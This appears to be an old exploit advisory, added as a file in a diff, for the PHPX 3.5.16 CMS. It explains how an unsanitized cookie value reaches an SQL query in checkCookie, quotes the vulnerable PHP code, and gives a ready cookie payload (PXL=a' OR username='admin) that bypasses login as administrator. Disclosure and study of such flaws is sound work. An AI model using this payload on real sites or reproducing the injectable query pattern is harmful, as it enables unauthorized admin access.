@@ -1,0 +1,106 @@
+=======================================================================
+
+                               = gnix =
+
+                       gnixmail at gmail dot com
+                        http://gnix.netsons.org
+         
+
+Application:  phpx
+              http://www.phpx.org/project.php (stable version)
+Versions:     3.5.16
+Platforms:    All
+Bug:          Cookie poisoning / Login bypass
+Date:         31 July 2008
+ 
+
+
+=======================================================================
+
+  1. Intro
+  2. Cookie poisoning and login bypass
+
+
+
+=======================================================================
+
+  1. Intro
+  ========
+  
+PHPX is a web portal system, blog,Content Management System (CMS), forums,
+and more. All files are currently hosted at http://www.phpx.org/project.php
+
+
+
+=======================================================================
+
+  2. Cookie poisoning and login bypass
+  ====================================
+
+Every file in phpx-3.5.16/ directory have two lines of code: one for
+include includes/functions.inc.php, and another to create a website object. 
+website's constructor will call checkCookie.
+
+
+  Source code (includes/functions.inc.php)
+  ---------------------------------------------------------------------
+  class website {
+    ...
+
+    function website(){
+      ...
+      
+      $this->checkCookie();
+  ---------------------------------------------------------------------
+
+
+The function checkCookie set the user_id if PXL cookie is set and the 
+query return an user_id, and an username.
+
+
+  Vulnerable code (includes/functions.inc.php lines 75 to 89) 
+  ---------------------------------------------------------------------
+  function checkCookie(){
+
+    if ($_COOKIE[PXL]){
+      list($user_id, $username) = $this->core->db->fetch("select user_id, username from users where sess = '$_COOKIE[PXL]'");
+      if (!$user_id){
+        setcookie("PXL", '', time() - 60, '', '', $this->core->secure);
+        $head = "Location: http://" . $_SERVER["HTTP_HOST"] .  $_SERVER["REQUEST_URI"];
+        header($head);
+      }
+      else {
+        if (strtolower($username) == "xnuiem"){ $this->debug = 1; }
+          $this->user_id = $user_id;
+      }
+    }
+  }
+  ---------------------------------------------------------------------
+
+
+This user_id is then used in the website constructor for set the user_id
+of the core class. 
+
+
+  Source code (includes/functions.inc.php line 32)
+  ---------------------------------------------------------------------
+  $this->core->user_id = $this->user_id;
+  ---------------------------------------------------------------------
+
+
+Now if you want to get the admin privileges and by pass the login, you
+have to create a cookie like this below:
+ 
+
+  ---------------------------------------------------------------------
+  PXL=a' OR username='admin
+  ---------------------------------------------------------------------
+
+  
+To do that you can use 'Modify Headers'.
+
+
+
+=======================================================================
+
+# milw0rm.com [2008-07-31]
